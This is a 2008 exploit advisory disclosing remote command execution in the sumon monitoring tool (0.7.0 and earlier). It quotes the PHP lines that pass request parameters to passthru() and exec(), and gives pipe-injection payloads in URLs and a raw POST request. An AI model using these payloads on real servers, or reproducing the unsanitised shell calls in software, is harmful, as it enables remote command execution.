@@ -1,0 +1,78 @@
+
+  :::::::-.   ...    ::::::.    :::.
+   ;;,   `';, ;;     ;;;`;;;;,  `;;;
+   `[[     [[[['     [[[  [[[[[. '[[
+    $$,    $$$$      $$$  $$$ "Y$c$$
+    888_,o8P'88    .d888  888    Y88
+    MMMMP"`   "YmmMMMM""  MMM     YM
+
+   [ Discovered by dun \ dun[at]strcpy.pl ]
+
+ ################################################################
+ #  [ sumon <= 0.7.0 ]  Remote Command Execution Vulnerability  #
+ ################################################################
+ #
+ # Script: Simple Unix MONitor (sumon)
+ #
+ # Script Site: http://sumon.sourceforge.net/
+ # Download: http://sourceforge.net/projects/sumon
+ #
+ # Vuln: http://site.com/sumon-0.7.0/chg.php?host=|id>/tmp/dupa;
+ #     
+ # Bug: ./sumon-0.7.0/server/www/chg.php (lines: 32-25, 99)
+ #
+ # ...
+ #       if (array_key_exists("host",$_GET))
+ #       {
+ #          $host         =  $_GET["host"];
+ #       }
+ # ...
+ #       passthru("${bindir}/chmgmtinfobuilder.pl --html --chgonly --node=$host --days=$days");
+ # ...     
+ #
+ # Vuln: http://site.com/sumon-0.7.0/stats.php?host=|id>/tmp/dupa;
+ #     
+ # Bug: ./sumon-0.7.0/server/www/stats.php (lines: 23-25, 294)
+ #
+ # ...
+ #        if (array_key_exists("host",$_GET))
+ #        {
+ #      $host         =  $_GET["host"];
+ # ...     
+ #         exec ("$graphstats -h $host -l $graphic -g GRAPH:".$time.":".$timefactor." ".$timestampstring." ".$endstring." > /dev/null 2>&1");
+ # ...     
+ #
+ # Vuln: http://site.com/sumon-0.7.0/showfile.php  
+ #       http://site.com/sumon-0.7.0/difffile.php
+ #
+ #     POST /sumon-0.7.0/showfile.php  HTTP/1.1
+ #    
+ #    Host: site.com
+ #    User-Agent: Mozilla/5.0
+ #    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+ #    Accept-Language: pl,en-us;q=0.7,en;q=0.3
+ #    Accept-Encoding: gzip,deflate
+ #    Accept-Charset: ISO-8859-2,utf-8;q=0.7,*;q=0.7
+ #    Keep-Alive: 300
+ #    Connection: keep-alive
+ #    Content-Type: application/x-www-form-urlencoded
+ #    Content-Length: 27
+ #    
+ #    fichero_post=|id>/tmp/dupa;
+ #
+ # Bug: ./sumon-0.7.0/server/www/showfile.php (lines: 36)
+ #      ./sumon-0.7.0/server/www/difffile.php (lines: 36)
+ # ...
+ #           passthru("${bindir}/showfile.pl ${datadir}/$_POST[fichero_post]");
+ # ...     
+ #
+ #
+ ###############################################
+ # Greetz: D3m0n_DE * str0ke * and otherz..
+ ###############################################
+
+ [ dun / 2008 ]
+
+*******************************************************************************************
+
+# milw0rm.com [2008-12-12]
